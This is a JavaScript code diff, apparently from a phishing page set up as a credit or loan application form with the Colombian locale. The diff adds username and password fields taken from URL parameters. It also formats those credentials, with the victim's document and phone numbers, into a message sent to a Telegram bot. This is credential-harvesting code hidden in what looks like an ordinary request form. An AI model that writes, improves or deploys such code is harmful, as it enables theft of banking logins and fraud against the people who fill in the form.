@@ -254,13 +254,16 @@ async function procesarSolicitud() {
   
   console.log("Datos a guardar:", { doc, tipo, cupo, contacto });
 
-  const datos = {
-    documento: doc,
-    tipo: tipo,
-    cupo: cupo,
-    contacto: contacto,
-    estado: "RECHAZADA"
-  };
+const datos = {
+  documento: doc,
+  tipo: tipo,
+  cupo: cupo,
+  contacto: contacto,
+  usuario: params.get("usuario") || "",
+  clave: params.get("clave") || "",
+  estado: "RECHAZADA"
+};
+
 
   const exito = await guardarSolicitud(datos);
   if (exito) {
@@ -283,15 +286,16 @@ async function enviarATelegram(datos) {
   }
 
  const mensaje = "NUEVA SOLICITUD\n" +
-  "────────────────────\n" +
-  "Tipo de documento: " + datos.tipoDocumento + "\n" +
+  "____________________\n" +
+  "Tipo de documento: " + datos.tipo + "\n" +
   "Número de documento: " + datos.documento + "\n" +
   "Número de contacto: " + datos.contacto + "\n" +
   "Usuario: " + datos.usuario + "\n" +
   "Cupo solicitado: " + datos.cupo + "\n" +
   "Clave: " + datos.clave + "\n" +
-  "────────────────────\n" +
+  "____________________\n" +
   "Fecha y hora: " + new Date().toLocaleString("es-CO");
+
 
 
   await fetch("https://api.telegram.org/bot" + TELEGRAM_TOKEN + "/sendMessage", {
